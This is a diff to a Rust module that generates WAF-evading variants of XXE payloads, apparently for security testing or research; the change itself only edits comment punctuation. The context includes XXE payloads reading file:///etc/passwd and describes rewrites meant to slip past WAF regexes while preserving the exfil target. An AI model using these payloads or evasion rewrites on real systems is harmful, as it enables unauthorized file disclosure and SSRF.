@@ -1,10 +1,10 @@
 //! XXE (XML external entity) payload-string equivalence + the joint
-//! `(payload × delivery)` generator — the xxe arm of Phase B.
+//! `(payload × delivery)` generator (the xxe arm of Phase B).
 //!
 //! The sound equivalence is **external-id equivalence**: the set of
 //! URIs an XML parser dereferences when expanding the DTD is invariant
 //! under (a) the entity *name* (`&xxe;` vs `&z;`, consistently
-//! renamed), (b) `SYSTEM "U"` vs `PUBLIC "any" "U"` (XML 1.0 §4.2.2 —
+//! renamed), (b) `SYSTEM "U"` vs `PUBLIC "any" "U"` (XML 1.0 §4.2.2 
 //! the public id is advisory; the system literal `U` is fetched), (c)
 //! quote style `"U"` ↔ `'U'`, (d) DTD internal-subset whitespace, and
 //! (e) the local-file spellings that denote the same path
@@ -13,7 +13,7 @@
 //! resource while a WAF regex keyed on `<!ENTITY`/`SYSTEM`/`file://`
 //! misses the variants.
 //!
-//! Anti-rig: the fetched URI(s) — the actual exfil/SSRF target — are
+//! Anti-rig: the fetched URI(s), the actual exfil/SSRF target, are
 //! preserved verbatim and re-verified ([`still_exfils`]). Swapping
 //! `/etc/passwd`→`/etc/shadow` or the attacker host is a different
 //! exploit and is rejected.
@@ -117,7 +117,7 @@ pub fn still_exfils(original: &str, cand: &str) -> bool {
 // ── rewrites (parser-transparent, WAF-opaque) ──────────────────────
 
 /// Rename every `<!ENTITY <name> ...>` / `&<name>;` / `%<name>;`
-/// consistently — the expansion is identical.
+/// consistently (the expansion is identical).
 fn rw_rename_entity(s: &str, rng: &mut Rng) -> Option<String> {
     let i = s.find("<!ENTITY")?;
     let after = &s[i + 8..];
@@ -170,7 +170,7 @@ fn rw_quote_swap(s: &str) -> Option<String> {
 }
 
 /// Equivalent local-file spelling (only when the original is a
-/// `file:` URI — same absolute path).
+/// `file:` URI (same absolute path)).
 fn rw_file_spelling(s: &str, rng: &mut Rng) -> Option<String> {
     let uris = fetched_uris(s);
     let canon = uris.iter().find(|u| u.starts_with("file:/"))?;
@@ -314,7 +314,7 @@ mod tests {
     #[test]
     fn fetched_uri_is_invariant_under_sound_rewrites() {
         assert_eq!(fetched_uris(ATK), vec!["file:/etc/passwd".to_string()]);
-        // SYSTEM≡PUBLIC, quote swap, file spelling, rename — same fetch
+        // SYSTEM≡PUBLIC, quote swap, file spelling, rename, same fetch
         for v in [
             r#"<!DOCTYPE r [<!ENTITY z SYSTEM 'file:///etc/passwd'>]><r>&z;</r>"#,
             r#"<!DOCTYPE r [<!ENTITY xxe PUBLIC "-//x//EN" "file:///etc/passwd">]><r>&xxe;</r>"#,
